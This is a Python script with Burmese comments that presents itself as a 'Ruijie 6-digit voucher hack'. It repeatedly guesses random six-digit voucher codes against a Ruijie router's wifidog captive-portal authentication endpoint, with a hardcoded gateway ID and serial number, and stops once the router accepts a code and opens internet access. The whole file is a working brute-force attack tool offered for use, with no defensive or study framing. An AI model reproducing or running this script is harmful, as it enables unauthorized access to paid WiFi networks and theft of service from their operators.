import sys, os, hashlib, requests, time, random
from colorama import Fore, init

init(autoreset=True)

# Canary ထဲက ရထားတဲ့ တည်ငြိမ်တဲ့ အချက်အလက်များ
TARGET_IP = "192.168.110.1"
GW_ID = "58b4bbd9c1e9"
GW_SN = "H1U42FJ004707"

def crack_voucher():
    print(f"{Fore.CYAN}[*] Ruijie Voucher Cracker စတင်နေပြီ...")
    
    with requests.Session() as s:
        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K)"})
        
        # Voucher Code တွေကို တစ်ခုပြီးတစ်ခု စမ်းမယ်
        # အချိန်မကုန်ရအောင် Random နဲ့ အရင်စမ်းတဲ့ logic သုံးထားတယ်
        while True:
            # ဂဏန်း ၆ လုံး Voucher Code ထုတ်မယ်
            voucher = str(random.randint(100000, 999999))
            
            try:
                auth_url = f"http://{TARGET_IP}:2060/wifidog/auth"
                params = {
                    "token": voucher, # Voucher ကို Token နေရာမှာ သုံးလေ့ရှိတယ်
                    "phoneNumber": voucher, # တချို့က phone နေရာမှာ စစ်တယ်
                    "gw_id": GW_ID,
                    "gw_sn": GW_SN
                }
                
                # Router ဆီ ပစ်သွင်းမယ်
                res = s.get(auth_url, params=params, timeout=2)
                
                # အောင်မြင်ရင် များသောအားဖြင့် 302 Redirect ဒါမှမဟုတ် Success စာသား ပြတယ်
                if res.status_code == 302 or "success" in res.text.lower():
                    print(f"\n{Fore.GREEN}[✔] VOUCHER FOUND: {voucher}")
                    print(f"{Fore.YELLOW}[!] အင်တာနက် ပွင့်သွားပါပြီ။")
                    break
                else:
                    # စမ်းသပ်နေတာကို မြင်ရအောင် တစ်ကြောင်းတည်းမှာ ပြမယ်
                    sys.stdout.write(f"\r{Fore.WHITE}[-] Testing: {voucher} (Failed)")
                    sys.stdout.flush()
            
            except:
                print(f"\n{Fore.RED}[!] Connection Lost. Retrying...")
                time.sleep(2)

if __name__ == "__main__":
    os.system('clear')
    print(f"{Fore.MAGENTA}========================================")
    print(f"{Fore.WHITE}      RUIJIE 6-DIGIT VOUCHER HACK")
    print(f"{Fore.MAGENTA}========================================")
    
    # WiFi ချိတ်ထားလား အရင်စစ်မယ်
    try:
        crack_voucher()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Stopped by User.")
